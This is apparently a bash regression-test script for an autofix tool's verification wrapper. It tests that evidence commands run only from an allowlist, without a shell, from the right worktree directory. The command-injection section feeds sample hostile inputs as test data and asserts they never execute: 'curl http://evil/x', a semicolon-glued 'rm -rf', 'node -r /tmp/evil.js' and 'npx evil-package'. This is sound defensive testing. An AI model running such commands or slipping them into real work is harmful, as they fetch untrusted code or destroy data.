#!/bin/bash
set -uo pipefail
cd "$(dirname "$0")" || exit 1; . ./helpers.sh
V=../bin/verify.sh; L=../bin/ledger.sh
export AUTOFIX_ROOT; AUTOFIX_ROOT="$(mktemp -d)"
export AUTOFIX_WORKSPACE_ROOT; AUTOFIX_WORKSPACE_ROOT="$(mktemp -d)"
mkdir -p "$AUTOFIX_WORKSPACE_ROOT/worktrees/br-1/plugins/my-plugin"

# Stub the allowlisted executables (`n`, `npx`) on PATH. `verify.sh signal`
# exec's evidence commands directly (no shell) and only permits
# `n test-php`/`n test-js` and `npx playwright test …`, so tests drive
# pass/fail through a token in the argv: an arg containing PASS → exit 0,
# FAIL → exit 1, otherwise exit 0. Each stub echoes its argv to stdout (so the
# failing-output-tail assertion has something to find) and appends it to
# ARGV_LOG so tests can assert the exact bytes reached the executable —
# proving no shell mangled a backslash and no metacharacter ran a command.
STUB="$(mktemp -d)"; export PATH="$STUB:$PATH"
export ARGV_LOG="$STUB/argv.log"; : > "$ARGV_LOG"
export CWD_LOG="$STUB/cwd.log"; : > "$CWD_LOG"
cat > "$STUB/n" <<'EOF'
#!/bin/bash
printf 'n %s\n' "$*" >> "${ARGV_LOG:?}"
printf '%s n %s\n' "$PWD" "$*" >> "${CWD_LOG:?}"
printf 'n %s\n' "$*"
for a in "$@"; do case "$a" in *NOTFOUND127*) exit 127 ;; *PASS*) exit 0 ;; *FAIL*) exit 1 ;; esac; done
exit 0
EOF
cat > "$STUB/npx" <<'EOF'
#!/bin/bash
printf 'npx %s\n' "$*" >> "${ARGV_LOG:?}"
printf '%s npx %s\n' "$PWD" "$*" >> "${CWD_LOG:?}"
printf 'npx %s\n' "$*"
for a in "$@"; do case "$a" in *PASS*) exit 0 ;; *FAIL*) exit 1 ;; esac; done
exit 0
EOF
chmod +x "$STUB/n" "$STUB/npx"

bash "$L" init runv NPPM-1 operator-named >/dev/null
bash "$L" set runv '.branch = "br-1"'
bash "$L" set runv '.decisions += [{key:"affected_repo", value:"my-plugin"}]'
bash "$L" evidence runv failing-test t.php 'n test-php --filter FAIL'

bash "$V" signal runv --expect fail
assert_eq 0 $? "--expect fail passes while signal fails"
bash "$V" signal runv --expect pass >/dev/null 2>&1 && rc=0 || rc=$?
assert_eq 1 "$rc" "--expect pass fails while signal fails"

bash "$L" evidence runv fixed t2.php 'n test-php --filter PASS'
bash "$V" signal runv --expect pass >/dev/null 2>&1 && rc=0 || rc=$?
assert_eq 1 "$rc" "mixed signals: any failing cmd fails --expect pass"

# missing worktree dir → signal dies fail-closed (never a false pass)
bash "$L" init runw NPPM-2 operator-named >/dev/null
bash "$L" set runw '.branch = "no-such-branch"'
bash "$L" set runw '.decisions += [{key:"affected_repo", value:"my-plugin"}]'
bash "$L" evidence runw failing-test t.php 'n test-php --filter FAIL'
bash "$V" signal runw --expect fail >/dev/null 2>&1 && rc=0 || rc=$?
assert_eq 1 "$rc" "missing worktree: signal dies (--expect fail)"
bash "$V" signal runw --expect pass >/dev/null 2>&1 && rc=0 || rc=$?
assert_eq 1 "$rc" "missing worktree: signal dies (--expect pass, no false pass)"

# evidence entries all with empty cmd → signal dies (nothing effective ran)
bash "$L" init rune NPPM-3 operator-named >/dev/null
bash "$L" set rune '.branch = "br-1"'
bash "$L" set rune '.decisions += [{key:"affected_repo", value:"my-plugin"}]'
bash "$L" evidence rune note t.php ''
bash "$L" evidence rune note t2.php ''
bash "$V" signal rune --expect pass >/dev/null 2>&1 && rc=0 || rc=$?
assert_eq 1 "$rc" "all-empty-cmd evidence: signal dies"

# ---- COMMAND-INJECTION regression -------------------------------------------
# Every evidence cmd outside the executable+subcommand allowlist must make
# `signal` die fail-closed, BEFORE any execution. A rejected run leaves ARGV_LOG
# untouched (the executable was never invoked).
reject_case() { # label cmd
  local label="$1" cmd="$2" rid rc
  rid="rej-$(printf '%s' "$label" | tr -cd 'a-z0-9')"
  bash "$L" init "$rid" NPPM-R operator-named >/dev/null
  bash "$L" set "$rid" '.branch = "br-1"'
bash "$L" set "$rid" '.decisions += [{key:"affected_repo", value:"my-plugin"}]'
  bash "$L" evidence "$rid" failing-test t.php "$cmd"
  : > "$ARGV_LOG"
  bash "$V" signal "$rid" --expect fail >/dev/null 2>&1 && rc=0 || rc=$?
  assert_eq 1 "$rc" "rejected (die): $label"
  assert_eq "" "$(cat "$ARGV_LOG")" "rejected cmd never executed: $label"
}
reject_case "npx-arbitrary-package"  'npx evil-package'
reject_case "npx-wrong-subcommand"   'npx playwright install'
reject_case "node-require-flag"      'node -r /tmp/evil.js'
reject_case "node-eval-flag"         'node -e process.exit(0)'
reject_case "bare-node-script"       'node evil.js'
reject_case "n-non-test-subcommand"  'n build newspack-plugin'
reject_case "semicolon-glued-subcmd" 'n test-php; rm -rf x'
reject_case "bare-executable"        'curl http://evil/x'
# `n test-js` always runs the package's whole Jest suite, so JS evidence goes
# through the related-tests helper instead, and needs a file.
reject_case "n-test-js-whole-suite"  'n test-js'
reject_case "jest-related-no-files"  'jest-related'

cat > "$STUB/node" <<'EOF'
#!/bin/bash
printf 'node %s\n' "$*" >> "${ARGV_LOG:?}"
printf 'chrome=%s\n' "${CHROME_PATH:-}" >> "${ARGV_LOG:?}.env"
# As Playwright's json reporter: counts of tests that ran, and load errors.
if [ -n "${PLAYWRIGHT_JSON_OUTPUT_FILE:-}" ]; then
  case "$*" in
    *NOJSON*) : ;;
    *FLAKYEXIT*) printf '{"stats":{"expected":0,"unexpected":0,"flaky":1},"errors":[]}' > "$PLAYWRIGHT_JSON_OUTPUT_FILE"; exit 1 ;;
    *LOADERRGREEN*) printf '{"stats":{"expected":1,"unexpected":0,"flaky":0},"errors":[{"message":"Error: a spec failed to load"}]}' > "$PLAYWRIGHT_JSON_OUTPUT_FILE"; exit 1 ;;
    *LOADERRRED*) printf '{"stats":{"expected":0,"unexpected":1,"flaky":0},"errors":[{"message":"Error: a spec failed to load"}]}' > "$PLAYWRIGHT_JSON_OUTPUT_FILE"; exit 1 ;;
    *NOTESTS*) printf '{"stats":{"expected":0,"unexpected":0,"flaky":0},"errors":[{"message":"Error: No tests found."}]}' > "$PLAYWRIGHT_JSON_OUTPUT_FILE" ;;
    *NOMODULE*) printf '{"stats":{"expected":0,"unexpected":0,"flaky":0},"errors":[{"message":"Cannot find package"}]}' > "$PLAYWRIGHT_JSON_OUTPUT_FILE" ;;
    *FAIL*) printf '{"stats":{"expected":0,"unexpected":1,"flaky":0},"errors":[]}' > "$PLAYWRIGHT_JSON_OUTPUT_FILE" ;;
    *) printf '{"stats":{"expected":1,"unexpected":0,"flaky":0},"errors":[]}' > "$PLAYWRIGHT_JSON_OUTPUT_FILE" ;;
  esac
  case "$*" in *NOJSON*|*NOTESTS*|*NOMODULE*) exit 1 ;; esac
fi
printf '%s node %s\n' "$PWD" "$*" >> "${CWD_LOG:?}"
[ -f "$1" ] || exit 9
for a in "$@"; do case "$a" in *PASS*) exit 0 ;; *FAIL*) exit 1 ;; esac; done
exit 0
EOF
chmod +x "$STUB/node"
bash "$L" init runjr NPPM-J operator-named >/dev/null
bash "$L" set runjr '.branch = "br-1"'
bash "$L" set runjr '.decisions += [{key:"affected_repo", value:"my-plugin"}]'
bash "$L" evidence runjr failing-test src/a.test.js 'jest-related src/a_FAIL.test.js'
: > "$CWD_LOG"
bash "$V" signal runjr --expect fail >/dev/null 2>&1
assert_eq 0 $? "jest-related evidence runs and reads red"
assert_contains "$(cat "$CWD_LOG")" "plugins/my-plugin node " "from the plugin dir"
assert_contains "$(cat "$CWD_LOG")" "lib/jest-related.js src/a_FAIL.test.js" "through the helper, with the given file"

# No-shell proof: an allowlisted `n test-php …` whose args carry a `; touch …`
# suffix is accepted (argv[1] is test-php) and RUNS, but the `touch` never
# executes — there is no shell, so `;` and the filename are literal argv.
marker="$STUB/pwned-$$"
rm -f "$marker"
bash "$L" init runinj NPPM-I operator-named >/dev/null
bash "$L" set runinj '.branch = "br-1"'
bash "$L" set runinj '.decisions += [{key:"affected_repo", value:"my-plugin"}]'
bash "$L" evidence runinj failing-test t.php "n test-php --filter FAIL; touch $marker"
bash "$V" signal runinj --expect fail
assert_eq 0 $? "injection suffix: runs as literal argv, still a fail signal"
[ -e "$marker" ] && present=yes || present=no
assert_eq no "$present" "injection suffix: no shell ran the 'touch' side effect"

# Legitimate backslashed PHPUnit FQCN filter is ACCEPTED and runs; the backslash
# reaches the executable literally (word-split has no shell backslash handling).
: > "$ARGV_LOG"
bash "$L" init runbs NPPM-B operator-named >/dev/null
bash "$L" set runbs '.branch = "br-1"'
bash "$L" set runbs '.decisions += [{key:"affected_repo", value:"my-plugin"}]'
bash "$L" evidence runbs fixed t.php 'n test-php --filter Newspack\Data_Events::test_PASS'
bash "$V" signal runbs --expect pass
assert_eq 0 $? "backslashed FQCN filter accepted and passes"
assert_contains "$(cat "$ARGV_LOG")" 'Newspack\Data_Events::test_PASS' \
  "backslash in filter reaches executable literally"

# Comma-separated group list is ACCEPTED (comma is literal argv, not a shell op).
: > "$ARGV_LOG"
bash "$L" init runcs NPPM-C operator-named >/dev/null
bash "$L" set runcs '.branch = "br-1"'
bash "$L" set runcs '.decisions += [{key:"affected_repo", value:"my-plugin"}]'
bash "$L" evidence runcs fixed t.php 'n test-php --group byline-block,data-events-PASS'
bash "$V" signal runcs --expect pass
assert_eq 0 $? "comma-separated --group list accepted and passes"
assert_contains "$(cat "$ARGV_LOG")" 'byline-block,data-events-PASS' \
  "comma in group list reaches executable literally"

# Playwright repro: the exact fixed prefix is ACCEPTED and runs the
# workspace's own Playwright CLI under node. npx would fetch Playwright from the
# registry wherever no local copy resolves, so it is never called.
PWD_FX="$AUTOFIX_WORKSPACE_ROOT/node_modules/.pnpm"
mkdir -p "$PWD_FX/playwright@1.0.0/node_modules/playwright" "$PWD_FX/playwright-core@1.0.0/node_modules/playwright-core" \
  "$PWD_FX/@playwright+test@1.0.0/node_modules/@playwright/test"
: > "$PWD_FX/playwright@1.0.0/node_modules/playwright/cli.js"
: > "$PWD_FX/@playwright+test@1.0.0/node_modules/@playwright/test/cli.js"
PT_DIR="$PWD_FX/@playwright+test@1.0.0/node_modules/@playwright/test"
printf '{"browsers":[{"name":"chromium-headless-shell","revision":"7"}]}\n' > "$PWD_FX/playwright-core@1.0.0/node_modules/playwright-core/browsers.json"
export PLAYWRIGHT_BROWSERS_PATH; PLAYWRIGHT_BROWSERS_PATH="$(mktemp -d)"; mkdir -p "$PLAYWRIGHT_BROWSERS_PATH/chromium_headless_shell-7"
PW_CLI="$PT_DIR/cli.js"
: > "$ARGV_LOG"
bash "$L" init runpw NPPM-P operator-named >/dev/null
bash "$L" set runpw '.branch = "br-1"'
bash "$L" set runpw '.decisions += [{key:"affected_repo", value:"my-plugin"}]'
bash "$L" evidence runpw playwright-repro r.spec.js 'npx playwright test specs/repro_PASS.spec.js'
bash "$V" signal runpw --expect pass
assert_eq 0 $? "npx playwright test <spec> accepted and passes"
assert_contains "$(cat "$ARGV_LOG")" "node $PW_CLI test specs/repro_PASS.spec.js --reporter=line,json" \
  "the spec reaches the workspace's @playwright/test CLI, with a JSON report"
assert_eq "$PT_DIR" "$(readlink "$AUTOFIX_ROOT/runs/runpw/node_modules/@playwright/test")" \
  "the run dir links @playwright/test so the spec's import resolves"
assert_eq 0 "$(find "$AUTOFIX_WORKSPACE_ROOT/worktrees/br-1" -name node_modules | grep -c .)" "and nothing is written into the worktree"

# A red counts only when a test ran and failed. A spec that could not load, or
# found no tests, also exits 1, and must never read as the red.
pwcase() { # rid spec — a run with one Playwright evidence command
  bash "$L" init "$1" NPPM-PW operator-named >/dev/null
  bash "$L" set "$1" '.branch = "br-1"'
  bash "$L" set "$1" '.decisions += [{key:"affected_repo", value:"my-plugin"}]'
  bash "$L" evidence "$1" playwright-repro r.spec.js "npx playwright test $2"
}
pwcase pwred specs/r_FAIL.spec.js
bash "$V" signal pwred --expect fail >/dev/null 2>&1
assert_eq 0 $? "a test that ran and failed is the red"
for c in NOTESTS NOMODULE NOJSON; do
  pwcase "pw$c" "specs/r_${c}_FAIL.spec.js"
  out="$(bash "$V" signal "pw$c" --expect fail 2>&1)" && rc=0 || rc=$?
  assert_eq 1 "$rc" "$c: not read as the red"
  assert_contains "$out" "could not run" "$c: reported as could not run"
done
# A report that reads green while Playwright exits non-zero (a flaky pass under
# --fail-on-flaky-tests) is not a green.
pwcase pwflaky "specs/r_FLAKYEXIT.spec.js --retries=1 --fail-on-flaky-tests"
out="$(bash "$V" signal pwflaky --expect pass 2>&1)" && rc=0 || rc=$?
assert_eq 1 "$rc" "a pass Playwright itself failed is not a green"
assert_contains "$out" "could not run" "and is reported as could not run"
# A load error beside tests that ran is not a result either way.
pwcase pwlg specs/r_LOADERRGREEN.spec.js
bash "$V" signal pwlg --expect pass >/dev/null 2>&1 && rc=0 || rc=$?
assert_eq 1 "$rc" "a load error beside a passing test is not a green"
pwcase pwlr specs/r_LOADERRRED.spec.js
bash "$V" signal pwlr --expect fail >/dev/null 2>&1 && rc=0 || rc=$?
assert_eq 1 "$rc" "a load error beside a failing test is not the red"
pwcase pwrep "specs/r_PASS.spec.js --reporter=dot"
bash "$V" signal pwrep --expect pass >/dev/null 2>&1 && rc=0 || rc=$?
assert_eq 1 "$rc" "an evidence command may not set its own reporter"
assert_eq 0 "$(grep -c '^npx ' "$ARGV_LOG")" "and npx is never called"

# A cache without the expected headless shell: the spec gets CHROME_PATH naming
# the newest installed one, so a Playwright config can launch it.
mv "$PLAYWRIGHT_BROWSERS_PATH/chromium_headless_shell-7" "$PLAYWRIGHT_BROWSERS_PATH/chromium_headless_shell-9"
mkdir -p "$PLAYWRIGHT_BROWSERS_PATH/chromium_headless_shell-9/x"
: > "$PLAYWRIGHT_BROWSERS_PATH/chromium_headless_shell-9/x/chrome-headless-shell"
: > "$ARGV_LOG.env"
bash "$V" signal runpw --expect pass >/dev/null 2>&1
assert_contains "$(cat "$ARGV_LOG.env")" "chrome=$PLAYWRIGHT_BROWSERS_PATH/chromium_headless_shell-9/x/chrome-headless-shell" \
  "the spec gets CHROME_PATH for the installed headless shell"
rm -rf "$PLAYWRIGHT_BROWSERS_PATH/chromium_headless_shell-9"; mkdir -p "$PLAYWRIGHT_BROWSERS_PATH/chromium_headless_shell-7"

# No workspace Playwright: the signal stops, and a red is never read off it.
mv "$PWD_FX/playwright@1.0.0" "$PWD_FX/hidden-pw"
bash "$L" init runnopw NPPM-P2 operator-named >/dev/null
bash "$L" set runnopw '.branch = "br-1"'
bash "$L" set runnopw '.decisions += [{key:"affected_repo", value:"my-plugin"}]'
bash "$L" evidence runnopw playwright-repro r.spec.js 'npx playwright test specs/repro_FAIL.spec.js'
out="$(bash "$V" signal runnopw --expect fail 2>&1)" && rc=0 || rc=$?
assert_eq 1 "$rc" "no workspace Playwright: --expect fail does not pass"
assert_contains "$out" "Playwright" "and says Playwright is missing"
mv "$PWD_FX/hidden-pw" "$PWD_FX/playwright@1.0.0"

# A command that could not run (126/127) is never the expected red.
bash "$L" init run127 NPPM-P3 operator-named >/dev/null
bash "$L" set run127 '.branch = "br-1"'
bash "$L" set run127 '.decisions += [{key:"affected_repo", value:"my-plugin"}]'
bash "$L" evidence run127 failing-test t.php 'n test-php --filter NOTFOUND127'
out="$(bash "$V" signal run127 --expect fail 2>&1)" && rc=0 || rc=$?
assert_eq 1 "$rc" "exit 127 does not pass --expect fail"
assert_contains "$out" "could not run" "and is reported as a command that could not run"

# CRITICAL 1 regression: a branch containing '/' (a Linear branchName like
# "jason/nppm-1-fix") lives at the SANITIZED path on disk — `n` runs
# safe_branch=$(tr '/' '-') when it names the worktree dir — not at a naive
# WORKSPACE_ROOT/worktrees/<raw-branch> join.
mkdir -p "$AUTOFIX_WORKSPACE_ROOT/worktrees/jason-nppm-1-fix/plugins/my-plugin"
bash "$L" init runslash NPPM-9 operator-named >/dev/null
bash "$L" set runslash '.branch = "jason/nppm-1-fix"'
bash "$L" set runslash '.decisions += [{key:"affected_repo", value:"my-plugin"}]'
bash "$L" evidence runslash failing-test t.php 'n test-php --filter FAIL'
bash "$V" signal runslash --expect fail
assert_eq 0 $? "slashed branch: signal finds worktree at the sanitized (dash) path"

# Wrong-reason visibility: the tail of every failing evidence cmd is surfaced,
# even when fail is the EXPECTED status (run nppm-273 bootstrap-error lesson)
bash "$L" init runtail NPPM-3 operator-named >/dev/null
bash "$L" set runtail '.branch = "br-1"'
bash "$L" set runtail '.decisions += [{key:"affected_repo", value:"my-plugin"}]'
bash "$L" evidence runtail failing-test t.php 'n test-php --filter BOOTSTRAP-MARKER-FAIL'
out="$(bash "$V" signal runtail --expect fail 2>&1)" && rc=0 || rc=$?
assert_eq 0 "$rc" "expected fail still passes the check"
assert_contains "$out" "BOOTSTRAP-MARKER" "failing cmd output tail surfaced on expected fail"

# `n` resolves its project from the cwd and refuses from the worktree root, so
# signal must run it from the affected unit's directory. Three secure runs read
# that refusal as the expected red.
BR1="$AUTOFIX_WORKSPACE_ROOT/worktrees/br-1"
: > "$CWD_LOG"
bash "$L" init runcwd NPPM-11 operator-named >/dev/null
bash "$L" set runcwd '.branch = "br-1"'
bash "$L" set runcwd '.decisions += [{key:"affected_repo", value:"my-plugin"}]'
bash "$L" evidence runcwd fixed t.php 'n test-php --filter PASS'
bash "$L" evidence runcwd playwright-repro r.spec.js 'npx playwright test specs/r_PASS.spec.js'
bash "$V" signal runcwd --expect pass >/dev/null 2>&1
assert_eq 0 $? "signal with n + npx evidence passes"
assert_contains "$(cat "$CWD_LOG")" "$BR1/plugins/my-plugin n test-php" "signal runs n from plugins/<affected_repo>"
assert_contains "$(cat "$CWD_LOG")" "$AUTOFIX_ROOT/runs/runcwd node $PW_CLI test" "signal runs Playwright from the run dir"

mkdir -p "$BR1/themes/my-theme"
: > "$CWD_LOG"
bash "$L" init runtheme NPPM-12 operator-named >/dev/null
bash "$L" set runtheme '.branch = "br-1"'
bash "$L" set runtheme '.decisions += [{key:"affected_repo", value:"my-theme"}]'
bash "$L" evidence runtheme fixed t.php 'n test-php --filter PASS'
bash "$V" signal runtheme --expect pass >/dev/null 2>&1
assert_eq 0 $? "signal resolves a theme unit"
assert_contains "$(cat "$CWD_LOG")" "$BR1/themes/my-theme n test-php" "signal runs n from themes/<affected_repo>"

# No affected_repo, or one that isn't in the worktree: die before running
# anything. Falling back to the root is what produced the wrong-reason red.
for case in none missing; do
  : > "$ARGV_LOG"
  bash "$L" init "runnorepo-$case" NPPM-13 operator-named >/dev/null
  bash "$L" set "runnorepo-$case" '.branch = "br-1"'
  [ "$case" = missing ] && bash "$L" set "runnorepo-$case" '.decisions += [{key:"affected_repo", value:"not-here"}]'
  bash "$L" evidence "runnorepo-$case" failing-test t.php 'n test-php --filter FAIL'
  bash "$V" signal "runnorepo-$case" --expect fail >/dev/null 2>&1 && rc=0 || rc=$?
  assert_eq 1 "$rc" "affected_repo $case: signal --expect fail dies instead of reading red"
  assert_eq "" "$(cat "$ARGV_LOG")" "affected_repo $case: n never ran"
done

# lint smoke: worktree repo with no changed PHP files vs merge-base → exit 0
WT="$AUTOFIX_WORKSPACE_ROOT/worktrees/br-1"
git -C "$WT" init -q
( cd "$WT" && echo hi > readme.txt && git add readme.txt \
  && git -c user.email=t@example.com -c user.name=t commit -qm init \
  && git update-ref refs/remotes/origin/main HEAD )
bash "$V" lint runv >/dev/null 2>&1
assert_eq 0 $? "lint: no changed PHP files exits 0"

# lint covers uncommitted and untracked PHP too; before the first commit a
# HEAD-only diff was empty and lint passed without looking at anything.
mkdir -p "$AUTOFIX_WORKSPACE_ROOT/vendor/bin"
printf '#!/bin/bash\nprintf "%%s\\n" "$@" > "%s"\n' "$STUB/phpcs.args" > "$AUTOFIX_WORKSPACE_ROOT/vendor/bin/phpcs"
chmod +x "$AUTOFIX_WORKSPACE_ROOT/vendor/bin/phpcs"
( cd "$WT" && echo '<?php' > tracked.php && git add tracked.php \
  && git -c user.email=t@example.com -c user.name=t commit -qm base \
  && git update-ref refs/remotes/origin/main HEAD \
  && echo '// edit' >> tracked.php && echo '<?php' > untracked.php )
bash "$V" lint runv >/dev/null 2>&1
assert_eq 0 $? "lint: uncommitted changes linted"
assert_contains "$(cat "$STUB/phpcs.args")" tracked.php "lint: modified-but-uncommitted file passed to phpcs"
assert_contains "$(cat "$STUB/phpcs.args")" untracked.php "lint: untracked file passed to phpcs"

# suite smoke: n test-php from plugins/<affected_repo>; no test-js without script
# Uses its own stub dir (prepended to PATH) so it shadows the signal stubs above;
# every signal-based assertion must therefore come BEFORE this point.
SUITE_STUB="$(mktemp -d)"; export PATH="$SUITE_STUB:$PATH"
cat > "$SUITE_STUB/n" <<'EOF'
#!/bin/bash
echo "$PWD n $*" >> "${N_LOG:?}"
exit 0
EOF
chmod +x "$SUITE_STUB/n"
export N_LOG="$SUITE_STUB/n.log"; : > "$N_LOG"
# node stands in for the Jest helper, which verify.sh starts with node.
cat > "$SUITE_STUB/node" <<'EOF'
#!/bin/bash
echo "$PWD node $*" >> "${N_LOG:?}"
[ -f "$1" ] || { echo "node stub: no such script $1" >> "${N_LOG:?}"; exit 9; }
exit "${NODE_STUB_RC:-0}"
EOF
chmod +x "$SUITE_STUB/node"
bash "$L" set runv '.decisions += [{key:"affected_repo", value:"my-plugin"}]'
mkdir -p "$WT/plugins/my-plugin/src"
printf '{"scripts":{"test":"newspack-scripts test"}}\n' > "$WT/plugins/my-plugin/package.json"
bash "$V" suite runv >/dev/null 2>&1
assert_eq 0 $? "suite exits 0"
assert_contains "$(cat "$N_LOG")" "plugins/my-plugin n test-php" "n test-php runs from plugin dir"
# The whole Jest suite never runs, only tests related to the changed files.
assert_eq 0 "$(grep -c 'test-js' "$N_LOG")" "n test-js never runs"
assert_eq 0 "$(grep -c ' node ' "$N_LOG")" "and with no changed JS, Jest does not run at all"
: > "$N_LOG"
echo 'export const a = 1;' > "$WT/plugins/my-plugin/src/a.js"
echo 'test( "a", () => {} );' > "$WT/plugins/my-plugin/src/a.test.ts"
echo 'x' > "$WT/plugins/my-plugin/src/notes.txt"
bash "$V" suite runv >/dev/null 2>&1
assert_eq 0 $? "suite with changed JS exits 0"
line="$(grep ' node ' "$N_LOG")"
assert_contains "$line" "plugins/my-plugin node " "Jest runs from the plugin dir"
assert_contains "$line" "lib/jest-related.js" "through the related-tests helper"
assert_contains "$line" "src/a.js" "with the changed source file"
assert_contains "$line" "src/a.test.ts" "and the changed test file"
assert_eq 0 "$(grep -c notes.txt <<<"$line")" "and nothing that is not JS or TS"
: > "$N_LOG"
NODE_STUB_RC=1 bash "$V" suite runv >/dev/null 2>&1 && rc=0 || rc=$?
assert_eq 1 "$rc" "a failing Jest run fails the suite"
: > "$N_LOG"
bash "$V" js runv src/other.js >/dev/null 2>&1
assert_eq 0 $? "js runs on files it is given"
assert_contains "$(cat "$N_LOG")" "lib/jest-related.js src/other.js" "and only those"
: > "$N_LOG"
printf '{"scripts":{"test":"echo No JS unit tests in this repository."}}\n' > "$WT/plugins/my-plugin/package.json"
bash "$V" suite runv >/dev/null 2>&1
assert_eq 0 "$(grep -c ' node ' "$N_LOG")" "Jest skipped for the echo placeholder"
: > "$N_LOG"
rm "$WT/plugins/my-plugin/package.json"
bash "$V" suite runv >/dev/null 2>&1
assert_eq 0 "$(grep -c ' node ' "$N_LOG")" "Jest skipped without a package.json"
rm -r "$WT/plugins/my-plugin/src"
: > "$N_LOG"
bash "$L" set runv '.decisions = []'
bash "$V" suite runv >/dev/null 2>&1 && rc=0 || rc=$?
assert_eq 1 "$rc" "suite dies without an affected_repo decision"
assert_eq "" "$(cat "$N_LOG")" "suite runs nothing without an affected_repo decision"
# --- profiles -----------------------------------------------------------------
cat > "$STUB/bash-ok" <<'EOF'
#!/bin/bash
printf 'bash-ok %s\n' "$*" >> "${ARGV_LOG:?}"; printf '%s bash-ok\n' "$PWD" >> "${CWD_LOG:?}"; exit 0
EOF
chmod +x "$STUB/bash-ok"
PROF="$(mktemp)"; cat > "$PROF" <<'EOF'
{ "newspack-workspace": { "base": {"ref":"origin/main","fetch":"origin main"}, "env": true,
    "path_scope": ["plugins/{affected_repo}/"], "commands": [], "suite": null, "lint": "phpcs", "push_remote": "origin" },
  "tooling": { "base": {"ref":"main","fetch":null}, "env": false, "path_scope": ["tools/"],
    "commands": ["bash-ok run"], "suite": ["bash-ok run suite"], "lint": "none", "push_remote": "fork" } }
EOF
export AUTOFIX_PROFILES="$PROF"
WT="$(mktemp -d)"
bash "$L" init runt NPPM-9 forge >/dev/null
bash "$L" set runt '.worktree = $w' --arg w "$WT"
bash "$L" set runt '.decisions += [{key:"profile", value:"tooling"}]'
bash "$L" evidence runt failing-test x 'bash-ok run one'
: > "$CWD_LOG"
bash "$V" signal runt --expect pass >/dev/null 2>&1
assert_eq 0 $? "profile command accepted as evidence"
assert_contains "$(cat "$CWD_LOG")" "$WT bash-ok" "profile command runs from the recorded worktree"
: > "$CWD_LOG"
bash "$V" suite runt >/dev/null 2>&1
assert_eq 0 $? "profile suite runs"
assert_contains "$(cat "$ARGV_LOG")" "bash-ok run suite" "profile suite command ran"
out="$(bash "$V" lint runt 2>&1)"; assert_contains "$out" "lint: none" "lint skipped for lint=none"

bash "$L" init runu NPPM-10 forge >/dev/null
bash "$L" set runu '.worktree = $w' --arg w "$WT"
bash "$L" set runu '.decisions += [{key:"profile", value:"drafted-x"}]'
bash "$L" evidence runu failing-test x 'bash-ok run one'
: > "$ARGV_LOG"
out="$(bash "$V" signal runu --expect pass 2>&1)" && rc=0 || rc=$?
assert_eq 1 "$rc" "unkept profile stops signal"
assert_contains "$out" "not used until the operator keeps it" "signal stops on the profile, not the allowlist"
assert_eq "" "$(cat "$ARGV_LOG")" "nothing ran under an unkept profile"
unset AUTOFIX_PROFILES

# I2: a suite command that reads stdin must not swallow the commands after it
cat > "$STUB/reads-stdin" <<'EOF'
#!/bin/bash
cat >/dev/null; printf 'reads-stdin %s\n' "$*" >> "${ARGV_LOG:?}"; exit 0
EOF
chmod +x "$STUB/reads-stdin"
PROF2="$(mktemp)"; cat > "$PROF2" <<'EOF'
{ "tooling": { "base": {"ref":"main","fetch":null}, "env": false, "path_scope": ["tools/"],
    "commands": ["bash-ok run", "reads-stdin run"], "suite": ["reads-stdin run first", "bash-ok run second"],
    "lint": "none", "push_remote": "fork" } }
EOF
export AUTOFIX_PROFILES="$PROF2"
: > "$ARGV_LOG"
bash "$V" suite runt >/dev/null 2>&1
assert_contains "$(cat "$ARGV_LOG")" "bash-ok run second" "suite runs every entry even when one reads stdin"
unset AUTOFIX_PROFILES

finish
